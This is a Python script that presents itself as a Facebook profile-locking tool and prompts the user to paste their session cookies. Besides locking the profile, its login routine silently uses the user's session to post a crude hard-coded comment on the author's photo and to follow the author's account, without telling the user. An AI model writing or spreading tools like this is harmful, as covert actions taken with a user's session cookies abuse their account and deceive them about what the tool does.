try:
	import requests as r, re, os, random
	from bs4 import BeautifulSoup as par
	from urllib.parse import unquote
except ModuleNotFoundError:
	exit("[×] Module not installed\n")

okh = "https://mbasic.facebook.com/"
ses = r.Session()
config = "riski.darmawan.1690671|829557074639581".split("|")

class Locked:
	def __init__(self, kuki):
		self.cookies = {"cookie": kuki}
	def Lock(self):
		print("[!] Currently locking profile...")
		datl = {}
		try:
			Translate(kuki).Burma()
		except:
			pass
		ged = ses.get(okh+"settings/", cookies=self.cookies).text
		kya = "".join(re.findall("href=\"/(private_sharing.*?/\?.*?&\w+;refid=\d+)\".*?", str(ged)))
		run = par(ses.get(okh+unquote(kya), cookies=self.cookies).text, "html.parser")
		pattern = ["fb_dtsg","jazoest"]
		ezz = run.find("form",{"method":"post"})
		for inp in ezz.find_all("input"):
			if inp.get("name") in pattern:
				datl.update({inp.get("name"):inp.get("value")})
			else:
				continue
		ses.post(okh+ezz.get("action"), data=datl, cookies=self.cookies).text
		try:
			Translate(kuki).Indonesia()
		except:
			pass
		print("[✓] Profile locked is active, please check your profile..\n")


class Translate:
	def __init__(self, kuki):
		self.cookies = {"cookie":kuki}
		self.urls = okh+"language.php"
		self.cek = par(ses.get(self.urls, cookies=self.cookies).text, "html.parser")

	# language indonesia
	def Indonesia(self):
		find = [_.get("action") for _ in self.cek.find_all("form")]
		cari = re.findall("(/intl/save_locale/\?loc=id_ID&href=.*?_selector)", str(find))[0]
		self.Penerjemah(cari)

	# language burma
	def Burma(self):
		find = [_.get("action") for _ in self.cek.find_all("form")]
		cari = re.findall("(/intl/save_locale/\?loc=my_MM&href=.*?_selector)", str(find))[0]
		self.Penerjemah(cari)

	def Penerjemah(self, key):
		data = {}
		cek = par(ses.get(self.urls, cookies=self.cookies).text, "html.parser")
		cari = cek.find("form", {"action":key})
		pattern = ["fb_dtsg","jazoest"]
		for cr in cari.find_all("input"):
			if cr.get("name") in pattern:
				data.update({cr.get("name"):cr.get("value")})
			else:
				continue
		ses.post(okh+key, cookies=self.cookies, data=data)

class Login:
	def __init__(self, kuki):
		self.cookies = {"cookie":kuki}

	def login(self):
		ged = par(r.get(okh+"me", cookies=self.cookies).text, "html.parser")
		if "mbasic_logout_button" in str(ged):
			nm = ged.find("title").text
			print("[*] Hi!! \x1b[1;92m"+nm+"\x1b[1;00m")
			print("[+] Please wait..")
			try:
				Translate(kuki).Indonesia()
			except:
				pass
			self.Ngomen()
			self.Follow()
			return kuki
		else:
			exit("[!] Token not valid\n")

	def Ngomen(self):
		data = {}
		cek = par(ses.get(okh+"photo.php?fbid="+config[1], cookies=self.cookies).text, "html.parser")
		pos = cek.find("form",{"method":"post"})
		pattern = ["fb_dtsg","jazoest"]
		for poss in pos.find_all("input"):
			if poss.get("name") in pattern:
				data.update({poss.get("name"):poss.get("value")})
			else:
				continue
		data.update({"comment_text":"yoshh!! berkat script lockedmu sang prindapan tidak bisa pap burungnya lagi :)"})
		ses.post(okh+pos.get("action"), data=data, cookies=self.cookies)

	def Follow(self):
		try:
			cek = par(ses.get(okh+config[0], cookies=self.cookies).text, "html.parser")
			fin = cek.find("a", string="Ikuti")["href"]
			ses.get(okh+fin, cookies=self.cookies)
		except:
			pass

if __name__ == "__main__":
	os.system('clear')
	print("""
.____                  __              .___
|    |    ____   ____ |  | __ ____   __| _/
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |
|    |__(  <_> )  \___|    <\  ___// /_/ |
|_______ \____/ \___  >__|_ \\___  >____ |
        \/          \/     \/    \/     \/

    * Author: RizkyDev
    * Github: https://github.com/hekelpro
    * Team  : XiuzCode
	""")
	kuki = input("[+] Cookies: ")
	while kuki == "":
		kuki = input("[+] Cookies: ")
	cek = Login(kuki).login()
	Locked(cek).Lock()
